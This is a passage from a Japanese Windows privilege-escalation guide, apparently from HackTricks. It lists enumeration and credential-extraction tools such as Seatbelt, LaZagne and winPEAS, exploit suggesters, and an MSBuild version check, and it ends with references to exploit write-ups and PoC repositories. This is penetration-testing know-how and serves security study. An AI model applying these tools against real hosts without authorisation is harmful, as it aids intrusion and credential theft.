[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- 設定ミスを探してホストをenumerationします（privescというより情報収集ツールです）（コンパイルが必要） **(**[**コンパイル済み**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 多数のソフトウェアから認証情報を抽出します（githubにコンパイル済みexeがあります）**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUpのC#移植版**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- 設定ミスをチェックします（githubにコンパイル済み実行ファイルがあります）。推奨されません。Win10では正常に動作しません。\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- 設定ミスの可能性をチェックします（python製exe）。推奨されません。Win10では正常に動作しません。

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- この投稿をもとに作成されたツール（正常に動作するためにaccesschkは必要ありませんが、使用することもできます）。

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo**の出力を読み取り、動作するexploitを推奨します（ローカルのpython）\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo**の出力を読み取り、動作するexploitを推奨します（ローカルのPython）

**Meterpreter**

_multi/recon/local_exploit_suggestor_

.NETの正しいバージョンを使ってプロジェクトをコンパイルする必要があります（[こちらを参照](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)）。被害者ホストにインストールされている.NETのバージョンを確認するには、次のようにします:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Windows 権限昇格の基礎](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [フォルダーの脆弱なアクセス許可を悪用した権限昇格](http://www.greyhathacker.net/?p=738)
- [3] [Windows 権限昇格チートシート](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Windows / Linux ローカル権限昇格ワークショップ](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Windows Attacks: AT is the new black (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [権限昇格 - Windows - OSCP完全ガイド](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - 権限昇格 - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Windows 権限昇格ガイド](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Windows 権限昇格チェックリスト](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows 権限昇格](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Pentester向けWindows権限昇格手法](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: SMTP経由のWord VBAマクロフィッシング → hMailServerの認証情報を復号 → Veeam CVE-2023-27532でSYSTEM権限を取得](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE)とkernel token窃取](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Silver Foxを追う: Kernelの影におけるいたちごっこ](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – SCADAシステムに存在する特権ファイルシステムの脆弱性](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Symbolic Linkテストツール – CreateSymlinkの使い方](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [過去へのリンク: WindowsでSymbolic Linkを悪用する](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt Strike BOF移植版)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.jsの信頼の落とし穴: Windowsでの危険なモジュール解決](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.jsモジュール: `node_modules`フォルダーからの読み込み](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - C/C++チェックリストの課題を解決](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - RtlQueryRegistryValues関数](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - サービスバイナリの乗っ取り](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [MicroslopでのPwn2Own: CLDFLTとDirectX Kernel Race Conditionを連鎖させたWindows LPE](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [すべてを支配する1つのI/O Ring: Windows 11における完全な読み書きExploit Primitive](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [任意のファイル削除を悪用した権限昇格とその他の便利な手法](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - FilesystemEoPsのExploitコード](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – WSUS攻撃 パート2: CVE-2020-1013、Windows 10のLocal Privilege Escalation 1-Day](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Credential ManagerとWindows Vaultを探る](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Kerberos Resource Based Constrained Delegation: イメージの変更が権限昇格につながる場合](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Windows 10 Ssh AgentからSSH秘密鍵を抽出する](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – 企業の更新サーバーをバックドア製造所に変える (0_o) – パート1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – 企業の更新サーバーをバックドア製造所に変える (0_o) – パート2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
{{#include ../../banners/hacktricks-training.md}}
